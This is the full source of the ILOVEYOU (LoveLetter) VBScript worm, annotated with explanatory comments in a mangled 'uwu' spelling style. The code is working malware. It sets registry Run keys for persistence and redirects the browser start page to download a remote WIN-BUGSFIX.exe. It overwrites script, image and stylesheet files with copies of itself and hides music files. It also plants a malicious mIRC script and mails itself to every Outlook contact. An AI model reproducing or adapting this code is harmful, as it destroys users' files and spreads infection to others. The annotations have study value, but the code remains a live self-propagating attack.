rem  bawok -wovewettew(vbe) <i hate go to schoow>
rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Gwouwp  /  Maniwa,Phiwippines
On Error Resume Next

rem Setuwp gwobaw vawiabwes to be uwsed thwouwghouwt suwbwouwtines and fuwnctions.
Dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow
eq = ""
ctr = 0

rem Open the cuwwwent scwipt fiwe and define "vbscopy" which can be uwsed to
rem wead its own contents. Used to wepwicate itsewf in othew fiwes.
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullname, 1)
vbscopy = file.ReadAll

main()

rem Suwbwouwtine to initawize the pwogwam
Sub main()
  On Error Resume Next
  Dim wscr, rr

  rem Cweates a sheww which wiww be uwsed to wead the wegistwy.
  Set wscr = CreateObject("WScript.Shell")
  rem Gets a wegistwy key which indicates the scwipting time-ouwt fwom Windows.
  rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")

  rem Checks if the cuwwwent timeouwt is mowe than 0.
  If (rr >= 1) Then
    rem Sets the timeouwt to 0, effectivewy making it so that the scwipt won't
    rem time ouwt, incase the system happens to be too swow to execuwte it.
    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
  End If

  rem Finds speciaw fowdews, suwch as system, tempowawy and windows fowdews.
  Set dirwin = fso.GetSpecialFolder(0)
  Set dirsystem = fso.GetSpecialFolder(1)
  Set dirtemp = fso.GetSpecialFolder(2)
  Set c = fso.GetFile(WScript.ScriptFullName)

  rem Copy itsewf into vbscwipt fiwes mskewnew32.vbs, win32dll.vbs and
  rem WOB-LETTEW-FOR-YOU.TXT.vbs
  c.Copy(dirsystem & "\MSKernel32.vbs")
  c.Copy(dirwin & "\Win32DLL.vbs")
  c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")

  rem Caww the othew suwbwouwtines.
  regruns()
  html()
  spreadtoemail()
  listadriv()
End Sub

rem Suwbwouwtine to cweate and uwpdate speciaw wegistwy vawuwes.
Sub regruns()
  On Error Resume Next
  Dim num, downread

  rem Set the system to auwtomaticawwy wuwn MSKernel32.vbs and Win32DLL.vbs on stawtuwp.
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", dirsystem & "\MSKernel32.vbs"
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL", dirwin & "\Win32DLL.vbs"

	rem Get intewnet Expwowew's downwoad diwectowy.
  downread = ""
  downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")

  rem If the diwectowy wasn't fouwnd, then uwse C:\ dwive as the downwoad diwectowy.
  If (downread = "") Then
    downread = "c:\"
  End If

  rem Check if a fiwe named "WinFAT32.exe" exists in the system fiwes.
  If (fileexist(dirsystem & "\WinFAT32.exe") = 1) Then
    Randomize

    rem Genewate a wandom nuwmbew fwom 1 to 4.
    num = Int((4 * Rnd) + 1)

	rem Randomwy uwpdate the Intewnet Expwowew's stawt page that weads to a
	rem page that wiww downwoad a mawiciouws execuwtabwe "WIN-BUGSFIX.exe".
    If num = 1 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
    ElseIf num = 2 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
    ElseIf num = 3 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
    ElseIf num = 4 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
    End If
  End If

  rem Check if the "WIN-BUGSFIX.exe" fiwe exists in the downwoad diwectowy.
  If (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) Then
  rem Add WIN-BUGSFIX.exe to wuwn on stawtuwp
    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"
  rem Update Intewnet Expwowew's stawt page to "about:blank"
    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"
  End If
End Sub

rem Suwbwouwtine to wist fowdews in dwives.
Sub listadriv()
  On Error Resume Next
  Dim d, dc, s

  Set dc = fso.Drives

  For Each d In dc
    If (d.DriveType = 2) Or (d.DriveType = 3) Then
      folderlist(d.path & "\")
    End If
  Next

  listadriv = s
End Sub

rem Suwbwouwtine infect othew fiwes, by copying itsewf into them as weww
rem as cweating a mawiciouws mIRC scwipt.
Sub infectfiles(folderspec)
  On Error Resume Next
  Dim f, f1, fc, ext, ap, mircfname, s, bname, mp3

  Set f = fso.GetFolder(folderspec)
  Set fc = f.Files

  For Each f1 In fc
    ext = fso.GetExtensionName(f1.path)
    ext = lcase(ext)
    s = lcase(f1.name)

    rem Copies itsewf into evewy fiwe with vbs/vbe extension.
    If (ext = "vbs") Or (ext = "vbe") Then
      Set ap = fso.OpenTextFile(f1.path, 2, true)

      ap.write vbscopy
      ap.close
    rem Copies itsewf into evewy fiwe with js/jse/css/wsh/sct/hta extension
    rem and cweates a copy of the fiwe with the .vbs extension.
    ElseIf (ext = "js")
      Or (ext = "jse")
      Or (ext = "css")
      Or (ext = "wsh")
      Or (ext = "sct")
      Or (ext = "hta")
    Then
      Set ap = fso.OpenTextFile(f1.path, 2, true)

      ap.write vbscopy
      ap.close
      bname = fso.GetBaseName(f1.path)

      Set cop = fso.GetFile(f1.path)

      cop.copy(folderspec & "\" & bname & ".vbs")
      fso.DeleteFile(f1.path)
    rem Copies itsewf into evewy fiwe with jpg/jpeg extension
    rem and cweates a copy of the fiwe with the .vbs extension.
    ElseIf (ext = "jpg") Or (ext = "jpeg") Then
      rem Copies itself
      Set ap = fso.OpenTextFile(f1.path, 2, true)

      ap.write vbscopy
      ap.close

      Set cop = fso.GetFile(f1.path)

      cop.copy(f1.path & ".vbs")
      fso.DeleteFile(f1.path)
    rem Copies itsewf into evewy fiwe with mp3/mp2 extension.
    ElseIf (ext = "mp3") Or (ext = "mp2") Then
      Set mp3 = fso.CreateTextFile(f1.path & ".vbs")

      mp3.write vbscopy
      mp3.close

      Set att = fso.GetFile(f1.path)
      rem Sets fiwe attwibuwtes to make the fiwe Hidden.
      rem Nowmaw fiwes have the attwibuwte set to 0 so adding 2 to it,
      rem wiww set the attwibuwtes to Hidden.
      att.attributes = att.attributes + 2
    End If

    rem Checks if the fowdew has awweady been infected, if not it wiww continuwe
    rem to infect the fiwes.
    If (eq <> folderspec) Then
      rem Looks fow mIRC and wewated fiwes to detewmine whethew it
      rem shouwwd cweate/wepwace its script.ini with a mawiciouws scwipt.
      If (s = "mirc32.exe")
        Or (s = "mlink32.exe")
        Or (s = "mirc.ini")
        Or (s = "script.ini")
        Or (s = "mirc.hlp")
      Then
        Set scriptini = fso.CreateTextFile(folderspec & "\script.ini")
        rem The fowwowing mIRC scwipt checks if the "nick" of a uwsew is the same
        rem as "me" to hawt and send a DCC command that wiww send a message to
        rem the uwsew with a wink to the WOB=LETTER-FOR-YOU html page on the
        rem system.
        scriptini.WriteLine "[script]"
        scriptini.WriteLine ";mIRC Script"
        scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, If mIRC will"
        scriptini.WriteLine "    corrupt... WINDOWS will affect and will not run correctly. thanks"
        scriptini.WriteLine ";"
        scriptini.WriteLine ";Khaled Mardam-Bey"
        scriptini.WriteLine ";http://www.mirc.com"
        scriptini.WriteLine ";"
        scriptini.WriteLine "n0=on 1:JOIN:#:{"
        scriptini.WriteLine "n1=  /If ( $nick == $me ) { halt }"
        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\LOVE-LETTER-FOR-YOU.HTM"
        scriptini.WriteLine "n3=}"
        scriptini.close

        eq = folderspec
      End If
    End If
  Next
End Sub

rem Suwbwouwtine uwsed to get fiwe wisting of a fowdew.
Sub folderlist(folderspec)
  On Error Resume Next
  Dim f, f1, sf

  Set f = fso.GetFolder(folderspec)
  Set sf = f.SubFolders

  rem Itewates ovew each suwbfowdew fwom the given top-wevew fowdew and
  rem wecuwwsivewy infect fiwes.
  For Each f1 In sf
    infectfiles(f1.path)
    folderlist(f1.path)
  Next
End Sub

rem Suwbwouwtine uwsed to cweate/wwite wegistwy entwies.
Sub regcreate(regkey,regvalue)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegWrite regkey, regvalue
End Sub

rem Suwbwouwtine uwsed to get wegistwy entwies.
Function regget(value)
  Set regedit = CreateObject("WScript.Shell")
  regget = regedit.RegRead(value)
End Function

rem Fuwnction to check if a fiwe exists.
Function fileexist(filespec)
  On Error Resume Next
  Dim msg

  If (fso.FileExists(filespec)) Then
    msg = 0
  Else
    msg = 1
  End If

  fileexist = msg
End Function

rem Fuwnction to check if a fowdew exists.
Function folderexist(folderspec)
  On Error Resume Next
  Dim msg

  If (fso.GetFolderExists(folderspec)) Then
    msg = 0
  Else
    msg = 1
  End If

  fileexist = msg
End Function

rem Suwbwouwtine to send emaiws to the uwsew's contacts thwouwgh MAPI
rem (Messaging appwication pwogwamming intewface), the API uwsed by Ouwtwook to
rem commuwnicate with the Micwosoft Exchange sewvew which awso hosts cawendaws
rem and addwess book.
Sub spreadtoemail()
  On Error Resume Next
  Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad

  rem Cweates a sheww to edit the wegistwy.
  Set regedit = CreateObject("WScript.Shell")
  rem Cweates a new Ouwtwook appwication object instance, to access the MAPI.
  Set out = WScript.CreateObject("Outlook.Application")
  rem Gets the MAPI namespace uwsed to access the addwess book wists.
  Set mapi = out.GetNameSpace("MAPI")

  rem Goes thwouwgh aww contacts in the addwess book and sends an emaiw
  rem with the WOB-LETTER-FOR-YOU program as an attachment.
  For ctrlists = 1 To mapi.AddressLists.Count
    Set a = mapi.AddressLists(ctrlists)
    x = 1
	rem gets a wegistwy key that is uwsed to check who has been sent an emaiw,
    rem awweady to ensuwwe that even if thewe may be duwpwicate contacts, it wiww
    rem onwy send the emaiw once to the same addwess.
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)

    If (regv = "") Then
      regv = 1
    End If

    If (int(a.AddressEntries.Count) > int(regv)) Then
      rem Itewates ovew each entwy in the addwess wist.
      For ctrentries = 1 To a.AddressEntries.Count
        malead = a.AddressEntries(x)
        regad = ""
        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead )

		rem if the contact hasn't yet been sent an emaiw, a new emaiw wiww be
        rem composed with the viwuws attached and a "kind" message and the
        rem suwbject"IWOBYOU".
        If (regad = "") Then
          Set male = out.CreateItem(0)

          male.Recipients.Add(malead)
          male.Subject = "ILOVEYOU"
          male.Body = vbcrlf & "kindly check the attached LOVELETTER coming from me."
          male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
          male.Send

          rem sets the wegistwy key to indicate that the emaiw has been sent
          rem to the cuwwwent contact.
          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
        End If

        x = x + 1
      Next

      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
    Else
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
    End If
  Next

  Set out = Nothing
  Set mapi = Nothing
End Sub

rem Suwbwouwtine to genewate and cweate the HTML fiwe fow WOB-LETTER-FOR-YOU.HTM.
Sub html
  On Error Resume Next
  Dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6

  rem Genewates an HTML page which contains a JScript and VBScript to wepwicate
  rem itsewf by wevewaging ActiveX. It awso wistens fow mouwse and key events,
  rem which wiww open additionaw windows of the same page.
  dta1 = "<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"
    & vbcrlf & _ "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"
    & vbcrlf & _ "<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"
    & vbcrlf & _ "<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "
    & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"
    & vbcrlf & _ "<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"
    & vbcrlf & _ "<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE>"
    & vbcrlf & _ "<?-?BODY><?-?HTML>"
    & vbcrlf & _ "<SCRIPT language=@-@JScript@-@>"
    & vbcrlf & _ "<!--?-??-?"
    & vbcrlf & _ "If (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"
    & vbcrlf & _ "?-??-?-->"
    & vbcrlf & _ "<?-?SCRIPT>"
    & vbcrlf & _ "<SCRIPT LANGUAGE=@-@VBScript@-@>"
    & vbcrlf & _ "<!--"
    & vbcrlf & _ "on error resume next"
    & vbcrlf & _ "Dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"
    & vbcrlf & _ "aw=1"
    & vbcrlf & _ "code="

  dta2 = "Set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"
    & vbcrlf & _ "Set dirsystem=fso.GetSpecialFolder(1)"
    & vbcrlf & _ "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"
    & vbcrlf & _ "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"
    & vbcrlf & _ "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"
    & vbcrlf & _ "set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"
    & vbcrlf & _ "wri.write code4"
    & vbcrlf & _ "wri.close"
    & vbcrlf & _ "If (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) Then"
    & vbcrlf & _ "If (err.number=424) Then"
    & vbcrlf & _ "aw=0"
    & vbcrlf & _ "End If"
    & vbcrlf & _ "If (aw=1) Then"
    & vbcrlf & _ "document.write @-@ERROR: can#-#t initialize ActiveX@-@"
    & vbcrlf & _ "window.close"
    & vbcrlf & _ "End If"
    & vbcrlf & _ "End If"
    & vbcrlf & _ "Set regedit = CreateObject(@-@WScript.Shell@-@)"
    & vbcrlf & _ "regedit.RegWrite@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"
    & vbcrlf & _ "?-??-?-->"
    & vbcrlf & _ "<?-?SCRIPT>"

  rem repwaces encoded chawactews fwom the above docuwment to fowm a vawid
  rem docuwment that can be cowwectwy opened and execuwted in the bwowsew.
  dt1 = replace(dta1, chr(35) & chr(45) & chr(35), "'")
  dt1 = replace(dt1, chr(64) & chr(45) & chr(64), """")
  dt4 = replace(dt1, chr(63) & chr(45) & chr(63), "/")
  dt5 = replace(dt4, chr(94) & chr(45) & chr(94), "\")
  dt2 = replace(dta2, chr(35) & chr(45) & chr(35), "'")
  dt2 = replace(dt2, chr(64) & chr(45) & chr(64), """")
  dt3 = replace(dt2, chr(63) & chr(45) & chr(63), "/")
  dt6 = replace(dt3, chr(94) & chr(45) & chr(94), "\")

  rem Opens a new fiwe system object, which is uwsed to wead this specific
  rem scwipt fiwe, that wiww then be injected into the HTM docuwment.
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set c = fso.OpenTextFile(WScript.ScriptFullName, 1)

  lines = Split(c.ReadAll,vbcrlf)
  l1 = ubound(lines)

  rem Encodes aww speciaw chawactews of the scwipt's HTM, as this scwipt
  rem wiww be injected into the HTM fiwe and execuwted.
  For n = 0 to ubound(lines)
    lines(n) = replace(lines(n), "'", chr(91) + chr(45) + chr(91))
    lines(n) = replace(lines(n), """", chr(93) + chr(45) + chr(93))
    lines(n) = replace(lines(n), "\", chr(37) + chr(45) + chr(37))

    If (l1 = n) Then
      lines(n) = chr(34) + lines(n) + chr(34)
    Else
      lines(n) = chr(34) + lines(n) + chr(34) & " & vbcrlf & _"
    End If
  Next

  rem Cweate the WOB-LETTER-FOR-YOU.HTM fiwe in the system diwectowy.
  Set b = fso.CreateTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM")
  b.close

	rem Cweates the HTM fiwe fwom evewything above.
  Set d = fso.OpenTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM", 2)
  d.write dt5
  d.write join(lines, vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
End Sub
